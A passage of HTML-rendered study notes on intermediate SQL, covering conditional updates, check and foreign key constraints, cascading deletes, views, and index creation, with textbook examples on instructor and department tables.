&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;update&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;instructor&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;set&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;salary&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;=&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;salary&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;*&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#3677a9&#34;&gt;1&lt;/span&gt;.&lt;span style=&#34;color:#3677a9&#34;&gt;03&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;where&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;salary&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&amp;gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#3677a9&#34;&gt;100000&lt;/span&gt;;&lt;span style=&#34;color:#666&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#666&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;update&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;instructor&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;set&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;salary&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;=&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;salary&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;*&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#3677a9&#34;&gt;1&lt;/span&gt;.&lt;span style=&#34;color:#3677a9&#34;&gt;05&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;where&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;salary&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&amp;lt;=&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#3677a9&#34;&gt;100000&lt;/span&gt;;&lt;span style=&#34;color:#666&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#666&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;/* alternative using case */&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#666&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;update&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;instructor&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;set&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;salary&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;=&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;case&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#666&#34;&gt;    &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;when&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;salary&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&amp;lt;=&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#3677a9&#34;&gt;100000&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;then&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;salary&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;*&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#3677a9&#34;&gt;1&lt;/span&gt;.&lt;span style=&#34;color:#3677a9&#34;&gt;05&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#666&#34;&gt;     &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;else&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;salary&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;*&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#3677a9&#34;&gt;1&lt;/span&gt;.&lt;span style=&#34;color:#3677a9&#34;&gt;03&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#666&#34;&gt;  &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;end&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;sql-intermediate-topics&#34; &gt;SQL Intermediate Topics
&lt;span&gt;
    &lt;a href=&#34;#sql-intermediate-topics&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h2&gt;&lt;h3 id=&#34;check-constraints&#34; &gt;Check Constraints
&lt;span&gt;
    &lt;a href=&#34;#check-constraints&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;create&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;table&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;department&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;(&lt;span style=&#34;color:#666&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#666&#34;&gt;  &lt;/span&gt;...&lt;span style=&#34;color:#666&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#666&#34;&gt;  &lt;/span&gt;budget&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#24909d&#34;&gt;numeric&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;(&lt;span style=&#34;color:#3677a9&#34;&gt;12&lt;/span&gt;,&lt;span style=&#34;color:#3677a9&#34;&gt;2&lt;/span&gt;)&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;check&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;(budget&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&amp;gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;),&lt;span style=&#34;color:#666&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#666&#34;&gt;  &lt;/span&gt;...&lt;span style=&#34;color:#666&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#666&#34;&gt;&lt;/span&gt;)&lt;span style=&#34;color:#666&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;foreign-key-contraints&#34; &gt;Foreign Key Contraints
&lt;span&gt;
    &lt;a href=&#34;#foreign-key-contraints&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;create&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;table&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;instructor&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;(&lt;span style=&#34;color:#666&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#666&#34;&gt;  &lt;/span&gt;...&lt;span style=&#34;color:#666&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#666&#34;&gt;  &lt;/span&gt;dept_name&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#24909d&#34;&gt;varchar&lt;/span&gt;(&lt;span style=&#34;color:#3677a9&#34;&gt;20&lt;/span&gt;)&lt;span style=&#34;color:#666&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#666&#34;&gt;  &lt;/span&gt;...&lt;span style=&#34;color:#666&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#666&#34;&gt;  &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;foreign&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;key&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;(dept_name)&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;references&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;department&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;)&lt;span style=&#34;color:#666&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;deleting-in-referenced-relation&#34; &gt;Deleting in Referenced Relation
&lt;span&gt;
    &lt;a href=&#34;#deleting-in-referenced-relation&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;p&gt;When creating a table, we can use the &lt;code&gt;references R on delete set null&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Cascade: &lt;code&gt;on delete cascade&lt;/code&gt; rows referencing key also get deleted&lt;/p&gt;
&lt;h3 id=&#34;views&#34; &gt;Views
&lt;span&gt;
    &lt;a href=&#34;#views&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;p&gt;virtual table&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;create&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;view&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;faculty&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;as&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;select&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;ID,&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;name,&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;dept_name&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;from&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;instructor&lt;span style=&#34;color:#666&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;We can use views to hide data&lt;/p&gt;
&lt;h4 id=&#34;modifying-views&#34; &gt;Modifying Views
&lt;span&gt;
    &lt;a href=&#34;#modifying-views&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;create&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;view&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;instructor_info&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;as&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;select&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;ID,&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;name,&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;building&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;from&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;instructor,&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;department&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;where&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;instructor.dept_name&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;=&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;department.dept_name;&lt;span style=&#34;color:#666&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#666&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;-- insert into instructor_info values(&amp;#39;69987&amp;#39;, &amp;#39;White&amp;#39;, &amp;#39;Taylor&amp;#39;); -- won&amp;#39;t work
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;updateable-views&#34; &gt;Updateable Views
&lt;span&gt;
    &lt;a href=&#34;#updateable-views&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h4&gt;&lt;h3 id=&#34;access-control&#34; &gt;Access Control
&lt;span&gt;
    &lt;a href=&#34;#access-control&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;h4 id=&#34;roles&#34; &gt;Roles
&lt;span&gt;
    &lt;a href=&#34;#roles&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h4&gt;&lt;h3 id=&#34;indexes&#34; &gt;Indexes
&lt;span&gt;
    &lt;a href=&#34;#indexes&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;An index is an auxiliary persistent data structure
&lt;ul&gt;
&lt;li&gt;Search tree (e.g., B+-tree), lookup table (e.g., hash table), etc&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;create&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;index&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;ins_name_index&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;on&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;instructor&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;(name);&lt;span style=&#34;color:#666&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#666&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;create&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;unique&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;index&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;ins_name_index&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;on&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;instructor&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;(name);&lt;span style=&#34;color:#666&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#666&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;drop&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;index&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;ins_name_index&lt;span style=&#34;color:#666&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Typically the index already exists on primary key and unique constraints.&lt;/p&gt;
&lt;h3 id=&#34;sql-relational-division&#34; &gt;SQL Relational Division
&lt;span&gt;
    &lt;a href=&#34;#sql-relational-division&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;p&gt;Assumes &lt;code&gt;model&lt;/code&gt; is distinct (primary key). If model was not distinct, you would have to add the distinct keyword in the subquery as well
as the ending count.&lt;/p&gt;
